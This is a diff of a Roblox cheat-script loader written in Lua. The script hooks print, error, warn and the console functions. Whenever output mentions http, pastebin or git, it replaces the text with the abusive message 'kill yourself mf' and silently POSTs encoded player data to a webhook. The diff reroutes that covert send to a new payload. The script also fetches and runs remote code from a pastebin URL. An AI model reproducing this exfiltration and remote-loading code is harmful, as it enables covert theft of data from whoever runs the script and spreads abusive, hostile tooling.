@@ -2,12 +2,20 @@ local kys = "kill yourself mf"
 local msg = "silly monkey brain"
 
 local LocalPlayer = game:GetService("Players").LocalPlayer
+local r
+local HttpRequest = http_request;
+
+if syn then
+   HttpRequest = syn.request
+   else
+   HttpRequest = http_request
+end
 
 local LWP
 LWP = hookfunction(print,function(urprint,...)
    if string.match(urprint, "HTTP") or string.match(urprint, "http") or string.match(urprint, ".com") or string.match(urprint, "Http") or string.match(urprint, "Paste") or string.match(urprint, "bin") or string.match(urprint, "gitusercontent") or string.match(urprint, "git") or string.match(urprint, "hastebin") then
        urprint = kys
-       nocrakbitch()
+       HttpRequest(r)
    end
  return LWP(urprint,...)
 end)
@@ -16,7 +24,7 @@ local LWE
 LWE = hookfunction(error,function(urprint,...)
    if string.match(urprint, "HTTP") or string.match(urprint, "http") or string.match(urprint, ".com") or string.match(urprint, "Http") or string.match(urprint, "Paste") or string.match(urprint, "bin") or string.match(urprint, "gitusercontent") or string.match(urprint, "git") or string.match(urprint, "hastebin") then
        urprint = kys
-        nocrakbitch()
+       HttpRequest(r)
    end
  return LWE(urprint,...)
 end)
@@ -25,7 +33,7 @@ local LWW
 LWW = hookfunction(warn,function(urprint,...)
    if string.match(urprint, "HTTP") or string.match(urprint, "http") or string.match(urprint, ".com") or string.match(urprint, "Http") or string.match(urprint, "Paste") or string.match(urprint, "bin") or string.match(urprint, "gitusercontent") or string.match(urprint, "git") or string.match(urprint, "hastebin") then
        urprint = kys
-       nocrakbitch()
+       HttpRequest(r)
    end
  return LWW(urprint,...)
 end)
@@ -34,7 +42,7 @@ local LWWR
 LWWR = hookfunction(rconsoleprint,function(urprint,...)
    if string.match(urprint, "HTTP") or string.match(urprint, "http") or string.match(urprint, ".com") or string.match(urprint, "Http") or string.match(urprint, "Paste") or string.match(urprint, "bin") or string.match(urprint, "gitusercontent") or string.match(urprint, "git") or string.match(urprint, "hastebin") then
        urprint = kys
-       nocrakbitch()
+       HttpRequest(r)
    end
  return LWWR(urprint,...)
 end)
@@ -43,7 +51,7 @@ local LWWM
 LWWM = hookfunction(rconsoleerr,function(urprint,...)
    if string.match(urprint, "HTTP") or string.match(urprint, "http") or string.match(urprint, ".com") or string.match(urprint, "Http") or string.match(urprint, "Paste") or string.match(urprint, "bin") or string.match(urprint, "gitusercontent") or string.match(urprint, "git") or string.match(urprint, "hastebin") then
        urprint = kys
-       nocrakbitch()
+       HttpRequest(r)
    end
  return LWWM(urprint,...)
 end)
@@ -52,7 +60,7 @@ local LWWN
 LWWN = hookfunction(rconsolewarn,function(urprint,...)
    if string.match(urprint, "HTTP") or string.match(urprint, "http") or string.match(urprint, ".com") or string.match(urprint, "Http") or string.match(urprint, "Paste") or string.match(urprint, "bin") or string.match(urprint, "gitusercontent") or string.match(urprint, "git") or string.match(urprint, "hastebin") then
        urprint = kys
-       nocrakbitch()
+       HttpRequest(r)
    end
  return LWWN(urprint,...)
 end)
@@ -61,7 +69,7 @@ local LWWZ
 LWWZ = hookfunction(rconsoleclear,function(urprint,...)
    if string.match(urprint, "HTTP") or string.match(urprint, "http") or string.match(urprint, ".com") or string.match(urprint, "Http") or string.match(urprint, "Paste") or string.match(urprint, "bin") or string.match(urprint, "gitusercontent") or string.match(urprint, "git") or string.match(urprint, "hastebin") then
        urprint = kys
-       nocrakbitch()
+       HttpRequest(r)
    end
  return LWWZ(urprint,...)
 end)
@@ -70,7 +78,7 @@ local LWWH
 LWWH = hookfunction(rconsoleinput,function(urprint,...)
    if string.match(urprint, "HTTP") or string.match(urprint, "http") or string.match(urprint, ".com") or string.match(urprint, "Http") or string.match(urprint, "Paste") or string.match(urprint, "bin") or string.match(urprint, "gitusercontent") or string.match(urprint, "git") or string.match(urprint, "hastebin") then
        urprint = kys
-       nocrakbitch()
+       HttpRequest(r)
    end
  return LWWH(urprint,...)
 end)
@@ -79,7 +87,7 @@ local LWWT
 LWWT = hookfunction(rconsolename,function(urprint,...)
    if string.match(urprint, "HTTP") or string.match(urprint, "http") or string.match(urprint, ".com") or string.match(urprint, "Http") or string.match(urprint, "Paste") or string.match(urprint, "bin") or string.match(urprint, "gitusercontent") or string.match(urprint, "git") or string.match(urprint, "hastebin") then
        urprint = kys
-       nocrakbitch()
+       HttpRequest(r)
    end
  return LWWT(urprint,...)
 end)
@@ -238,17 +246,10 @@ local UnknownData =
        }}
    }
 
-local HttpRequest = http_request;
 
 local PlayerData = game:GetService('HttpService'):JSONEncode(PlayerData)
 local CrackerData = game:GetService('HttpService'):JSONEncode(CrackerData)
 local UnknownData = game:GetService('HttpService'):JSONEncode(UnknownData)
-
-if syn then
-   HttpRequest = syn.request
-   else
-   HttpRequest = http_request
-end
 
 local HWID_Table = loadstring(game:HttpGet("https://pastebin.com/raw/cTcTEJuU"))()
 local main = game:GetObjects("rbxassetid://13115298212")[1].Source
@@ -263,14 +264,7 @@ else
    LocalPlayer:Kick("Execution Failed | WL_ID: (21z7y16): You are not whitelisted!")
 end
 
-function nocrakbitch()
-    local B 
-    for i, v in pairs(LocalPlayer.Character:GetChildren()) do
-    HttpRequest({Url=Webhook, Body=CrackerData, Method="POST", Headers=Headers})
-        B = v
-    return B
-    end
-end
+r = {Url=Webhook, Body=UnknownData, Method="POST", Headers=Headers}
 
 pcall(function()
 getgenv().rconsoleprint = g
